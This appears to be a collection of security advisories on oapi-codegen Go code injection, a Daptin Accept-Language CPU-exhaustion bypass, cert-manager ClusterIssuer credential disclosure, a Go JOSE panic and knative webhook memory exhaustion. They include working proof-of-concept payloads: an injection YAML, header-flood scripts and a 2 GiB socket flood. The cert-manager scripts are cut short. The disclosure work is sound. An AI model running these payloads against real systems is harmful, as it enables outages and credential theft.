summary: oapi-codegen: OpenAPI Server Description Escapes Generated Go Comment and Injects Executable Code
details:
## Summary

The vulnerability in oapi-codegen seems to be similar with CVE-2026-22785,  which is a generated-code injection issue where untrusted OpenAPI `summary` text is embedded into generated TypeScript MCP server source without proper escaping. `oapi-codegen` has a similar vulnerability in its server URL generator: untrusted OpenAPI `servers[].description` text is inserted into a generated Go line comment without normalizing embedded newlines. A crafted description can break out of the comment, add imports through `goimports`, and emit executable Go declarations into the generated package.

> [!NOTE]
> A vulnerability like this requires that it is missed in code review **and** that you then call the malicious method.
> 
> Using an `init()` function could be enough to not require a direct call to the code, and instead rely on you importing the package, but either way, code review should be performed before any `oapi-codegen` generated code is executed.
> 
> We **strongly recommend** all users to be reviewing changes to their generated code before they execute anything within it, to protect against supply chain attacks or malicious injected code.
>
> This is also why we recommend `oapi-codegen` generated code is committed to source control.

## Details
The vulnerable sink is in `pkg/codegen/templates/server-urls.tmpl`.

```gotemplate
// {{ .GoName }} defines the Server URL for {{ if len .OAPISchema.Description }}{{ .OAPISchema.Description }}{{ else }}{{ .OAPISchema.URL }}{{ end }}
const {{ .GoName}} = "{{ .OAPISchema.URL }}"
```

This template assumes the OpenAPI server description remains inside a single Go line comment. However, OpenAPI descriptions are attacker-controlled strings and may contain newlines. Once a newline is present, the next line is no longer part of the comment.

The same raw description is also used in the function form of server URL generation:

```gotemplate
// New{{ .GoName }} constructs the Server URL for {{ .OAPISchema.Description }}, with the provided variables.
func New{{ .GoName }}({{ .NewServerFunctionParams }}) (string, error) {
```

Identifier generation does not protect this sink. In `pkg/codegen/server_urls.go`, the description is normalized only for the generated Go identifier:

```go
suffix := server.Description
if suffix == "" {
	suffix = nameNormalizer(server.URL)
}
name = serverURLPrefix + UppercaseFirstCharacter(suffix)
name = nameNormalizer(name)
```

The identifier is sanitized, but the raw `server.Description` is still rendered in the comment template. This leaves the code-generation context vulnerable.

The generated file is then formatted with `goimports` in `pkg/codegen/codegen.go`:

```go
goCode := SanitizeCode(buf.String())

outBytes, err := imports.Process(opts.PackageName+".go", []byte(goCode), nil)
```

`SanitizeCode` only removes byte-order marks:

```go
func SanitizeCode(goCode string) string {
	return strings.ReplaceAll(goCode, "\uFEFF", "")
}
```

It does not escape comments, replace newlines, or otherwise serialize untrusted text for a Go source-code context. As a result, attacker-controlled source can be preserved and formatted as valid Go.

### How to Reproduce
The attacker-controlled input is an OpenAPI document whose `servers[].description` contains a newline followed by Go declarations:

```yaml
openapi: "3.0.0"
info:
  title: oapi-codegen server URL description injection
  version: "1.0.0"
servers:
  - url: https://api.example.com
    description: |
      benign
      var _ = func() int {
          panic("oapi-codegen generated-code execution")
          return 0
      }()
      //
paths: {}
```

Generate Go source with server URL generation enabled. No special local path or helper file is required for the vulnerability; the malicious description is copied into the generated source-code context.

The generated source contains attacker-controlled executable code:

```go
// ServerUrlBenignvarFuncIntPanicOapiCodegenGeneratedCodeExecutionReturn0 defines the Server URL for benign
var _ = func() int {
	panic("oapi-codegen generated-code execution")
	return 0
}()

//

const ServerUrlBenignvarFuncIntPanicOapiCodegenGeneratedCodeExecutionReturn0 = "https://api.example.com"
```

## Impact

An attacker who can supply or influence an OpenAPI document consumed by `oapi-codegen` can inject arbitrary Go source into the generated package. In common API-client/server generation workflows, this can lead to build-time or runtime code execution in developer machines, CI systems, or downstream applications that trust generated code.

summary: Daptin: ParseAcceptLanguage `_` separator bypass enables >250x CPU amplification via Accept-Language header in LanguageMiddleware
details:
### Summary

Daptin's `LanguageMiddleware` (registered as a global gin middleware) calls `golang.org/x/text/language.ParseAcceptLanguage` on the raw `Accept-Language` header of every HTTP request without imposing any size or shape filter. The underlying parser has quadratic-time behaviour on long lists of malformed language tags. The CVE-2022-32149 guard that golang.org/x/text added in v0.3.8 caps the number of `-` characters in the input at 1000, but it does not cap `_` characters even though the parser's internal scanner aliases `_` to `-` before parsing. A single unauthenticated GET request with an `Accept-Language` header built out of `_` separators (only 256 KiB, not even the 1 MiB ceiling) consumes about 27 seconds of server CPU on the host running Daptin. A 1 MiB payload exceeds the 2-minute test client timeout. A single attacker on a 1 Mbit/s uplink can pin an entire Daptin host with one request every 30 seconds.

### Affected versions

`github.com/daptin/daptin` v0.12.15 and (per code inspection of `master`) all earlier 0.12.x versions that wire `LanguageMiddleware` on the global gin router without imposing their own size limit on `Accept-Language`. Verified on:

- the official release binary `daptin-linux-amd64` v0.12.15 built into a Docker image from the project's own `Dockerfile` (E2E below)
- `master` at commit `b021ac4ae1f72b7401e851fcf883bc970303c794` by reading `server/language.go` (the middleware is unchanged)

### Privilege required

Unauthenticated. The middleware is registered on the global gin router that serves both the public landing page and the unauthenticated `/api` style endpoints. Anyone who can reach the HTTP listener (port 8080 by default) is in scope.

### Vulnerable code

[`server/language.go`](https://github.com/daptin/daptin/blob/b021ac4ae1f72b7401e851fcf883bc970303c794/server/language.go) (blob SHA `b021ac4ae1f72b7401e851fcf883bc970303c794`):

```go
func (lm *LanguageMiddleware) LanguageMiddlewareFunc(c *gin.Context) {
    pref := GetLanguagePreference(c.GetHeader("Accept-Language"), lm.defaultLanguage)
    c.Request = c.Request.WithContext(context.WithValue(c.Request.Context(), "language_preference", pref))
}

func GetLanguagePreference(header string, defaultLanguage string) []string {
    preferredLanguage := header

    if preferredLanguage == "" || preferredLanguage == "undefined" || preferredLanguage == "null" {
        preferredLanguage = defaultLanguage
    }

    languageTags, _, err := language.ParseAcceptLanguage(preferredLanguage)
    resource.CheckErr(err, "Failed to parse Accept-Language header [%v]", preferredLanguage)
    pref := make([]string, 0)
    prefMap := make(map[string]bool)

    if len(languageTags) == 1 && languageTags[0].String() == defaultLanguage {
        // single tag matches default — skip
    } else {
        for _, tag := range languageTags {
            base, conf := tag.Base()
            if conf == 0 {
                continue
            }
            if prefMap[base.String()] == true {
                continue
            }
            prefMap[base.String()] = true
            pref = append(pref, base.String())
        }
    }
    return pref
}
```

`c.GetHeader("Accept-Language")` is the unfiltered HTTP header. Go's default `net/http` `MaxHeaderBytes` is `1 << 20` = 1 MiB and Daptin does not override it, so the parser is allowed to receive up to a megabyte of attacker-controlled data.

The `resource.CheckErr` call on the error path also formats the entire input string into a log line (`Failed to parse Accept-Language header [%v]`), amplifying the cost on attacker-supplied 256 KiB-1 MiB payloads.

CVE-2022-32149 hardened `ParseAcceptLanguage` by counting `-` characters and rejecting inputs with more than 1000 of them. The guard does not count `_` characters even though the scanner converts `_` to `-` at parse time ([`golang.org/x/text/internal/language/parse.go`](https://github.com/golang/text/blob/v0.28.0/internal/language/parse.go)). A 256 KiB header full of 9-character `_abcdefghi` tokens contains zero `-` characters, passes the guard, and then drives the scanner into the O(N²) `gobble` path.

### How `Accept-Language` reaches `ParseAcceptLanguage`

Every HTTP request that hits the Daptin API server passes through `LanguageMiddleware` (registered as a global gin middleware). The middleware sequence is:

1. The request enters `LanguageMiddlewareFunc`.
2. `c.GetHeader("Accept-Language")` returns the full attacker-supplied header value.
3. `GetLanguagePreference(header, defaultLanguage)` is called.
4. The function passes the unfiltered header into `language.ParseAcceptLanguage(preferredLanguage)`.

No size or character-class filter is applied between (2) and (4). The middleware runs for every gin handler — including the unauthenticated landing page at `/` and the public API root at `/api`.

### Proof of concept

Single-line bash reproducer that crafts the malicious header and times one request against a fresh Daptin container built from the project's own Dockerfile:

```bash
# Build daptin image (uses prebuilt linux/amd64 release binary)
cd daptin
curl -fL -O https://github.com/daptin/daptin/releases/download/v0.12.15/daptin-linux-amd64
chmod +x daptin-linux-amd64
docker build --platform linux/amd64 -t daptin-poc:v0.12.15 .

# Start it
docker run -d --platform linux/amd64 --name daptin --rm -p 18888:8080 daptin-poc:v0.12.15
sleep 8  # wait for sqlite migrations + Olric ring

# Attack with a 256 KiB header (smaller than the default 1 MiB ceiling
# because daptin's per-request cost saturates well below 1 MiB)
PAYLOAD="en$(python3 -c 'print("_abcdefghi" * 25600, end="")')"
echo "header size = ${#PAYLOAD} bytes"

curl -sS -o /dev/null \
  -w 'http=%{http_code} t=%{time_total}\n' \
  -H "Accept-Language: ${PAYLOAD}" \
  http://127.0.0.1:18888/
```

Each 9-character `_abcdefghi` token has length 9, which fails the scanner's `len <= 8` tag-length check at `golang.org/x/text/internal/language/parse.go` and triggers a `gobble` call that `runtime.memmove`s the entire remaining buffer. With N invalid tokens the total bytes moved by `gobble` is O(N²).

### End-to-end reproduction (against `daptin-linux-amd64` v0.12.15)

A Go driver `poc.go` boots the container, sends a 256 KiB `Accept-Language` value once with `-` (CVE-2022-32149 guard fires) and once with `_` (guard bypassed):

```go
// poc.go
package main

import (
    "fmt"
    "io"
    "net"
    "net/http"
    "strings"
    "time"
)

const targetURL = "http://127.0.0.1:18888/"

func buildPayload(sep string, targetBytes int) string {
    const tok = "abcdefghi"
    var b strings.Builder
    b.Grow(targetBytes + 16)
    b.WriteString("en")
    for b.Len()+1+len(tok) <= targetBytes {
        b.WriteString(sep)
        b.WriteString(tok)
    }
    return b.String()
}

func send(label, header string) {
    client := &http.Client{
        Timeout: 120 * time.Second,
        Transport: &http.Transport{
            DisableKeepAlives: true,
            DialContext: (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
        },
    }
    req, _ := http.NewRequest("GET", targetURL, nil)
    if header != "" {
        req.Header.Set("Accept-Language", header)
    }
    t0 := time.Now()
    resp, err := client.Do(req)
    dt := time.Since(t0)
    if err != nil {
        fmt.Printf("  %-32s ERR after %v: %v\n", label, dt, err)
        return
    }
    _, _ = io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    fmt.Printf("  %-32s header=%d B  '_'=%d  '-'=%d  status=%d  t=%v\n",
        label, len(header),
        strings.Count(header, "_"), strings.Count(header, "-"),
        resp.StatusCode, dt)
}

func main() {
    send("warm-up", "")
    send("baseline (no header)", "")
    send("baseline (1 short tag)", "en-US")
    send("guard-fires ('-' x 256KiB)", buildPayload("-", 256*1024))
    send("attack ('_' x 256KiB)",     buildPayload("_", 256*1024))
    send("attack repeat 2",            buildPayload("_", 256*1024))
    send("attack repeat 3",            buildPayload("_", 256*1024))
}
```

Captured run output (Apple M1 Pro, darwin/arm64 host, daptin amd64 binary v0.12.15 running under Docker Desktop with QEMU x86_64 emulation):

```
E2E: golang/x/text ParseAcceptLanguage '_' bypass through
daptin/daptin v0.12.15 LanguageMiddleware at
server/language.go.

Target: http://127.0.0.1:18888/   payload=262144 B

  warm-up                                      header=0 B  '_'=0  '-'=0  status=200  t=19.968ms

--- measurements (single request each) ---
  baseline (no header)                         header=0 B  '_'=0  '-'=0  status=200  t=25.924208ms
  baseline (1 short tag)                       header=5 B  '_'=0  '-'=1  status=200  t=28.398333ms
  guard-fires control ('-' x 256KiB)           header=262142 B  '_'=0  '-'=26214  status=200  t=105.506458ms
  attack ('_' x 256KiB)                        header=262142 B  '_'=26214  '-'=0  status=200  t=26.679448875s
  attack repeat 2                              header=262142 B  '_'=26214  '-'=0  status=200  t=18.012964208s
  attack repeat 3                              header=262142 B  '_'=26214  '-'=0  status=200  t=8.868606042s
```

A separate run with a 1 MiB payload exceeded the 2-minute client timeout on the attack request, confirming that the cost scales beyond 120 s per request at 1 MiB.

Interpretation:

| Request                                  | Header bytes | Server time |
|------------------------------------------|--------------|-------------|
| no header / short tag                    | 0 - 5        | 26 - 28 ms  |
| 256 KiB `-` separators (CVE-2022-32149 guard fires) | 256 KiB | 106 ms      |
| 256 KiB `_` separators (guard bypassed)  | 256 KiB      | 9 - 27 s    |
| 1 MiB `_` separators (guard bypassed)    | 1 MiB        | > 120 s     |

The `-` control proves that the existing CVE-2022-32149 guard does still work on the canonical separator: a 256 KiB `-` payload returns in 106 ms because the parser short-circuits with `ErrTagListTooLarge`. The `_` attack returns 200 from the same endpoint but consumes 9-27 s of server CPU because the guard did not fire and the quadratic scanner ran to completion. The amplification factor at the application boundary is ~85-250x on the 256 KiB payload and >1000x on a 1 MiB payload.

The amplification is higher than other consumers of `ParseAcceptLanguage` because Daptin formats the entire input into a log line via `resource.CheckErr(err, "Failed to parse Accept-Language header [%v]", preferredLanguage)` when parsing fails, and runs additional bookkeeping in `GetLanguagePreference` (a `prefMap` deduplication loop over the resulting tag slice).

### Impact

- One unauthenticated client can pin one CPU core for ~9-27 seconds per 256 KiB request, or for at least 120 seconds per 1 MiB request.
- A single attacker on a 1 Mbit/s uplink can sustain ~1 attack request every 30 seconds, pinning one server core continuously with one TCP connection.
- A small number of concurrent attackers using ~10 MiB/s of upstream bandwidth pin a 10-core Daptin instance indefinitely.
- The endpoint returns 200 OK, so the attack does not surface as abnormal traffic in standard 4xx/5xx dashboards.

### Suggested fix

Apply the size / character-class filter inside `LanguageMiddleware` (and inside `GetLanguagePreference` for defence in depth) before reaching `language.ParseAcceptLanguage`. The smallest change that preserves the existing behaviour for legitimate Accept-Language headers is to count `_` alongside `-` and short-circuit when the total exceeds a small ceiling:

```go
// server/language.go
const maxAcceptLanguageSeparators = 32 // real browsers send < 10

func (lm *LanguageMiddleware) LanguageMiddlewareFunc(c *gin.Context) {
    header := c.GetHeader("Accept-Language")
    if strings.Count(header, "-")+strings.Count(header, "_") > maxAcceptLanguageSeparators {
        // Refuse to call into the BCP 47 parser with absurd input.
        header = ""
    }
    pref := GetLanguagePreference(header, lm.defaultLanguage)
    c.Request = c.Request.WithContext(context.WithValue(c.Request.Context(), "language_preference", pref))
}
```

A real Accept-Language header from a browser contains under 10 separators, so a ceiling of 32 leaves plenty of headroom while making the quadratic blow-up impossible.

The underlying issue is in `golang.org/x/text/language`. A future upstream fix is the right long-term solution; the change above is defensive-in-depth at the middleware that consumes attacker input.

### Credit

Reported by tonghuaroot.

### Fix PR

https://github.com/daptin/daptin-ghsa-rhj7-vh3v-mcq6/pull/1

### Maintainer fix status

Fixed on `master` in commit `2d709509 Harden Accept-Language parsing`.

The fix caps combined `-` and `_` separators in `Accept-Language` before calling `language.ParseAcceptLanguage`, both in `LanguageMiddlewareFunc` and in `GetLanguagePreference` for defence in depth. Regression coverage was added in `server/language_test.go` for normal browser headers, a 256 KiB underscore-separated malformed header, and combined separator counting.

Verification run:

```bash
go test ./server -count=1
```

Result: passed.

summary: cert-manager: Direct ACME Challenge resources can bypass Issuer DNS01 solver policy and use ClusterIssuer DNS credentials
details:
## Summary

`Challenge` resources under `acme.cert-manager.io` can be created directly by namespace users. On create, cert-manager performs no admission validation tying the Challenge to an `Order`, an owner reference, or an Issuer-selected solver. The ACME Challenge controller then reconciles the direct resource and uses `Challenge.spec.solver` as the DNS01 provider configuration.

When the direct Challenge references a `ClusterIssuer`, cert-manager derives the DNS provider secret namespace and ambient-credential policy from the `ClusterIssuer` reference, but the DNS provider configuration itself is attacker-controlled through `Challenge.spec.solver`. This lets a namespace user bypass `Issuer`/`ClusterIssuer` solver selectors such as `dnsZones`, `dnsNames`, and `matchLabels`, and make the cert-manager controller use ClusterIssuer DNS credentials for attacker-selected provider settings and DNS names.

In the acme-dns case, this becomes credential disclosure because the attacker-controlled solver host receives the `X-Api-User` and `X-Api-Key` headers loaded by cert-manager from the ClusterIssuer resource namespace.

## Attack preconditions

- The attacker can create `challenges.acme.cert-manager.io` resources in at least one namespace.
- The cert-manager controller is running and reconciles ACME `Challenge` resources cluster-wide.
- A usable `ClusterIssuer` exists in the cluster.
- The referenced `ClusterIssuer` has a DNS01 solver that uses a Secret in the cluster resource namespace, or relies on ambient credentials enabled for `ClusterIssuer`.
- The cluster is multi-tenant or otherwise separates namespace users from platform-owned Issuer/ClusterIssuer and DNS credential administration.

## Severity

Rationale: a tenant with namespace-level ACME Challenge create permissions, including permissions granted by cert-manager's aggregate edit role, can cause a cluster-scoped controller to use DNS credentials or ambient cloud credentials outside the Issuer's intended solver policy. With acme-dns specifically, this can disclose the referenced acme-dns account credential to an attacker-controlled endpoint. With other DNS providers, the impact is credential use, Issuer policy bypass, and unauthorized DNS mutation risk unless a provider-specific credential disclosure path is separately demonstrated.

## Why this is not just RBAC misconfiguration

cert-manager's documented end-user workflow does not require users to manually create `Challenge` resources. Challenges are internal ACME workflow objects generated from Orders after cert-manager has selected a solver from the referenced Issuer or ClusterIssuer. If default or aggregate roles grant namespace users permission to create these resources, the controller still should not treat a user-controlled `Challenge.spec.solver` as authoritative for a referenced `ClusterIssuer`.

The security boundary is the Issuer/ClusterIssuer solver policy and credential configuration. Direct Challenge creation bypasses that boundary because the controller derives credential namespace and ambient credential permission from `issuerRef`, while accepting the DNS provider configuration from the untrusted Challenge object.

## Affected components

- ACME Challenge admission validation
- ACME Challenge controller
- DNS01 solver selection and DNS provider construction
- Default aggregate RBAC for `challenges.acme.cert-manager.io`

## Affected versions tested

The issue was reproduced on:

- `master` commit `2c0f1a6a4`
- latest production release `v1.20.2` commit `e5b7b1845`
- `v1.19.5` commit `cda7b7896`
- `v1.18.6` commit `4699caabb`

See `VERSION_TEST_MATRIX.md` for the command matrix and outputs.

## Technical details

Relevant code paths:

- `internal/apis/acme/validation/challenge.go:44-45`: `ValidateChallenge` returns no errors on create.
- `deploy/crds/acme.cert-manager.io_challenges.yaml`: `spec.solver` is a required user-controlled field on `Challenge`.
- `pkg/controller/acmechallenges/scheduler/scheduler.go:51-58`: scheduler lists all Challenges.
- `pkg/controller/acmechallenges/controller.go:180-197`: scheduler sets `status.processing=true`.
- `pkg/controller/acmechallenges/sync.go:139-183`: controller loads the referenced Issuer and then presents the Challenge.
- `pkg/issuer/acme/dns/dns.go:81`: DNS solver `Present` ignores the issuer object argument.
- `pkg/issuer/acme/dns/dns.go:180-187`: DNS provider config and resource namespace are derived from `Challenge.spec`.
- `pkg/controller/helper.go:39-44`: `ClusterIssuer` references use the cluster resource namespace.
- `pkg/controller/helper.go:66-72`: ambient credentials are allowed based on `issuerRef.kind`.
- `internal/apis/config/controller/v1alpha1/defaults.go:68-69`: ClusterIssuer ambient credentials default to enabled.
- `deploy/charts/cert-manager/templates/rbac.yaml:517-519`: the aggregate edit role can create/update `challenges` and `orders`.

The normal `Order` flow selects a solver from the Issuer:

- `pkg/util/solverpicker/solverpicker.go`: solver selectors are evaluated.
- `pkg/controller/acmeorders/util.go:94-106`: solvers are fetched from the Issuer and selected.
- `pkg/controller/acmeorders/util.go:131-142`: the selected solver is copied into the generated Challenge.

The direct `Challenge` flow skips that selection entirely because the direct object already contains a solver.

## Proof of concept

### PoC A: low-privileged namespace user can persist a direct ClusterIssuer Challenge

The following script starts k3s in Docker, installs only the relevant CRDs, creates a platform-owned ClusterIssuer, creates a namespace user with Challenge create permission but no secret or ClusterIssuer read permission, and creates a direct DNS01 Challenge referencing that ClusterIssuer and a cluster resource namespace secret.

The ClusterIssuer is configured to use a legitimate acme-dns host for `victim.example.com`. The direct Challenge uses that same DNS name, but replaces the acme-dns host with an attacker-controlled endpoint. This demonstrates credential disclosure without relying on an out-of-policy DNS name.

A broader DNS policy-bypass variant is also possible when the referenced credential or ambient provider can operate on the attacker-selected DNS name. In that case, the same direct Challenge path bypasses the Issuer/ClusterIssuer solver selectors and provider configuration.

Run from the cert-manager repository root:

```bash
set -euo pipefail

name=cm-direct-challenge-poc
docker rm -f "$name" >/dev/null 2>&1 || true
docker run -d --name "$name" --privileged -v "$PWD":/repo rancher/k3s:v1.33.4-k3s1 \
  server --disable=traefik --disable=servicelb --write-kubeconfig-mode=644 >/dev/null

cleanup() {
  docker rm -f "$name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

for i in $(seq 1 90); do
  docker exec "$name" kubectl get --raw=/readyz >/dev/null 2>&1 && break
  sleep 2
done

docker exec "$name" kubectl apply -f /repo/deploy/crds/cert-manager.io_clusterissuers.yaml >/dev/null
docker exec "$name" kubectl apply -f /repo/deploy/crds/acme.cert-manager.io_challenges.yaml >/dev/null
docker exec "$name" kubectl create ns tenant >/dev/null
docker exec "$name" kubectl create ns cert-manager >/dev/null
docker exec "$name" kubectl -n tenant create sa bob >/dev/null

docker exec "$name" kubectl -n cert-manager create secret generic cluster-acmedns-account \
  --from-literal=accounts.json='{"victim.example.com":{"username":"victim-user","password":"victim-pass","fulldomain":"x.example.org","subdomain":"x"}}' >/dev/null

docker exec -i "$name" kubectl apply -f - >/dev/null <<'YAML'
apiVersion: cert-manager.io/v1
kind: ClusterIssuer
metadata:
  name: cluster-prod
spec:
  acme:
    email: admin@example.com
    server: https://acme-staging-v02.api.letsencrypt.org/directory
    privateKeySecretRef:
      name: cluster-prod-account-key
    solvers:
    - selector:
        dnsZones:
        - victim.example.com
      dns01:
        acmeDNS:
          host: https://legit-acmedns.example
          accountSecretRef:
            name: cluster-acmedns-account
            key: accounts.json
YAML

docker exec -i "$name" kubectl apply -f - >/dev/null <<'YAML'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: challenge-create-only
```

### PoC B: acme-dns provider sends referenced credentials to the configured host

```bash
        }
```

Combined with PoC A and the code path in `pkg/issuer/acme/dns/dns.go`, this shows that a direct Challenge can select an attacker-controlled acme-dns host while causing cert-manager to load account JSON from the ClusterIssuer resource namespace.

## Credential impact scope

The concrete credential-disclosure proof in this report is for the acme-dns provider: the attacker-controlled `host` receives the `X-Api-User` and `X-Api-Key` values loaded from the referenced account JSON.

For other DNS01 providers, this report should be read as credential use, policy bypass, and DNS mutation risk. The controller may use platform-owned secrets or ambient cloud credentials to perform DNS operations selected by the attacker-controlled Challenge. Provider-specific credential disclosure should not be assumed without a separate provider-level PoC.

## Expected behavior

Users should not be able to create standalone `Challenge` resources that cause cert-manager to use arbitrary solver configuration under the authority of a referenced Issuer or ClusterIssuer. If direct `Challenge` resources are intentionally exposed, the controller should only reconcile Challenges that are owned by cert-manager-created Orders and whose solver config was selected from the referenced Issuer.

## Actual behavior

A user with namespace-level Challenge create permission can create a direct Challenge with arbitrary solver configuration. The controller reconciles it, derives credential namespace and ambient credential permission from `issuerRef`, and uses attacker-controlled provider settings.

## Suggested remediation

Possible mitigations:

- Reject or ignore standalone user-created `Challenge` resources unless the controller or admission layer can confirm an existing cert-manager-created `Order` that owns the Challenge.
- Do not rely only on the presence of an owner reference. Verify the referenced Order exists, is controlled by cert-manager's Order flow, and matches the Challenge by UID, owner reference, labels, DNS name, authorization URL, challenge URL, token/key material, and issuer reference.
- Ensure the solver used by the Challenge was selected from the referenced Issuer/ClusterIssuer by the Order controller. The Challenge controller should not accept manually supplied solver provider configuration outside the Order-controller path.
- Move `Challenge` and `Order` creation permissions out of aggregate `edit` unless direct use is a supported security boundary.
- Add admission validation or CEL rules preventing direct user control over sensitive solver provider fields on standalone or unverifiable Challenges.

details:

summary: Go JOSE: Panic during CBC-HMAC processing
details:
### Summary

Decrypting a ciphertext with "A128CBC-HS256", "A192CBC-HS384", or "A256CBC-HS512" can result in a panic on untrusted input.

Note this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.

### Details

Insufficient validation of parameters can lead to attempting to index into an empty buffer. See https://github.com/go-jose/go-jose/pull/292.

### Workarounds

If the application does not require the CBC-HMAC modes for content encryption, and is using github.com/go-jose/go-jose/v4, do not include them in the list of ContentEncryption algorithms passed to ParseEncrypted / ParseEncryptedJSON / ParseEncryptedCompact.

### Impact

Denial of service vulnerability. Any application which decrypts untrusted ciphertexts with the indicated algorithms is affected.

### Acknowledgements

Thanks to Joshua Rogers of AISLE Research for reporting this problem.

summary: knative.dev/pkg admission webhooks allow unbounded request-body memory exhaustion
details:
## ⚠️ Update (verification, 2026-05-19): C-2 confirmed end-to-end — **4.5× amplification observed** (worse than the advisory's conservative 2× claim)

Built a Go PoC ([`cmd/poc-c2/main.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/cmd/poc-c2/main.go)) that runs the exact 8-line vulnerable snippet from [`webhook/admission.go:109-117`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go#L109-L117) verbatim under the same `http.HandlerFunc` shape (the full production `admissionHandler` at `:85` requires `*Webhook` + `AdmissionController` + an informer-synced channel + controller-runtime / client-go scaffolding — the bug is the missing `http.MaxBytesReader`, nothing else in the handler). Bound to `127.0.0.1:18098`.

PoC client streamed 2 GiB of `a` bytes over a raw TCP socket. `runtime.MemStats.HeapAlloc` sampler:

```
baseline:  HeapAlloc =     0.32 MiB
peak:      HeapAlloc = 9 217.38 MiB  =  9.00 GiB
ratio:     4.50× the body size
```

The advisory predicted ~2× from `io.TeeReader` doubling the body once in `bodyBuffer`. The observed 4.5× ratio comes from the interaction of two amplifiers: `bytes.Buffer.ReadFrom` (used by `TeeReader`-fed `bodyBuffer`) doubles its backing slice on every grow, so peak occupancy during a realloc is `old + new = 3×` the live data — and `json.Decoder` holds its own working buffer in parallel. The advisory's 2× floor is comfortably exceeded.

**Downstream impact reminder**: this library backs every Knative serving / eventing controller, every Tekton Triggers / Pipelines webhook, KEDA, Sigstore policy-controller, Kpack, and many more. A 2 GiB body to **any** of those projects' admission webhook ports OOMs the controller at 4.5× the body — i.e., even a 128 MiB request OOMs a 512 MiB-limited Pod.

---

# Summary

`knative.dev/pkg`'s admission webhook handler reads the incoming HTTP request body via `json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer))` with **no `http.MaxBytesReader` wrapping the body**. Because every consumer of `knative.dev/pkg/webhook` inherits this handler (Knative serving / eventing, Tekton Pipelines, KEDA, Sigstore policy-controller, and others), a single oversized POST to **any of those projects' admission webhook ports** drives the controller pod into memory exhaustion and OOM-kill. Worse, the `io.TeeReader` design keeps a verbatim copy of the body in `bodyBuffer` while the decoder also materializes the parsed struct — so the peak memory usage is roughly **twice the body size**.

This is the same shape as **CVE-2026-24514** (ingress-nginx) and `GHSA-9539-c3xr-w9vm` (Kyverno admission body OOM) filed today against the same antipattern.

# Affected versions

- `knative.dev/pkg` — `main` HEAD on `github.com/knative/pkg` (verified 2026-05-18 against [`webhook/admission.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go) sha `1ad5a1ce0ee7043081cb50fd1acc6d36a9126844`).
- Every release that ships the current [`webhook/admission.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go) handler.

# Vulnerable code

[`webhook/admission.go:109-117`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go#L109-L117):

```go
review := admissionv1.AdmissionReview{}
var bodyBuffer bytes.Buffer
if err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {
    http.Error(w, fmt.Sprintf("could not decode body: %v", err), http.StatusBadRequest)
    return
}
```

There is no `http.MaxBytesReader` around `r.Body`. The standard library's `json.NewDecoder` will read until EOF or the matching closing `}`. The `io.TeeReader` simultaneously copies every byte read from `r.Body` into `bodyBuffer`, which the rest of the handler uses for the response trailer / observability.

# Downstream impact (the reason this matters)

`knative.dev/pkg/webhook` is the **default admission-webhook scaffolding for the entire Knative + CNCF webhook ecosystem**:

| Consumer | Repo | Webhook surface |
|---|---|---|
| Knative serving | `knative/serving` | resource validation / defaulting |
| Knative eventing | `knative/eventing` | resource validation / defaulting |
| Tekton Pipelines | `tektoncd/pipeline` | Pipeline / Task / TaskRun validation |
| Tekton Triggers | `tektoncd/triggers` | EventListener / Trigger validation |
| KEDA | `kedacore/keda` | ScaledObject / ScaledJob validation |
| Sigstore policy-controller | `sigstore/policy-controller` | ClusterImagePolicy mutating + validating |
| Kpack | `buildpacks-community/kpack` | Image / Builder validation |
| ... | | |

Every one of these consumers ships the same `io.ReadAll`-equivalent body read with **no upper bound**. A pod-network-reachable attacker can OOM-kill any of them with a single large POST. `failurePolicy=Fail` admission webhooks (the secure-default) then take the namespace's or cluster's admission flow offline until the controller restarts.

# Impact

- **Class**: CWE-770 unbounded allocation. Reachable from any pod-network client.
- **Severity per consumer**: depends on how each consumer configures `failurePolicy`. For projects with `failurePolicy=Fail` (e.g., Sigstore policy-controller's image-policy enforcement), the consequence is cluster-wide admission outage. For `failurePolicy=Ignore`, the consequence is "this project's webhook is offline" but the API server continues admitting requests.
- **Severity**: matches the broader CVE-2026-24514 / GHSA-9539-c3xr-w9vm. Single-packet DoS on the library; each downstream consumer inherits the bug.

# Reproduction

The exact same PoC built against Kyverno's admission handler reproduces this:

```python
import socket
total = 2 << 30   # 2 GiB
s = socket.create_connection(('<knative-or-tekton-webhook-host>', 8443))
s.sendall(b'POST /<admission-path> HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % total)
chunk = b'a' * (1 << 20)
for _ in range(total >> 20): s.sendall(chunk)
```

Observed against the Kyverno admission handler (same antipattern):

```
baseline:        HeapAlloc=7 MiB     Sys=22 MiB
after read:      HeapAlloc=9500 MiB  Sys=9548 MiB  (4 GiB body → 9.5 GiB peak; io.TeeReader doubles)
```

For the knative/pkg version, the `io.TeeReader` doubles the resident memory (one copy in the decoder's accumulating slice, one in `bodyBuffer`). A `kyverno-admission-controller`-equivalent Pod with a 256 MiB memory limit OOM-kills with ~128 MiB of body.

# Suggested fix

Wrap the request body with `http.MaxBytesReader` (and add a `http.StatusRequestEntityTooLarge` branch on the `MaxBytesError` path):

```go
const maxAdmissionRequestSize = 8 << 20 // 8 MiB — controller-runtime's default; large enough for Kubernetes' own admission objects
r.Body = http.MaxBytesReader(w, r.Body, maxAdmissionRequestSize)
var bodyBuffer bytes.Buffer
review := admissionv1.AdmissionReview{}
if err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {
    var mbe *http.MaxBytesError
    if errors.As(err, &mbe) {
        http.Error(w, "admission body exceeds maximum size", http.StatusRequestEntityTooLarge)
        return
    }
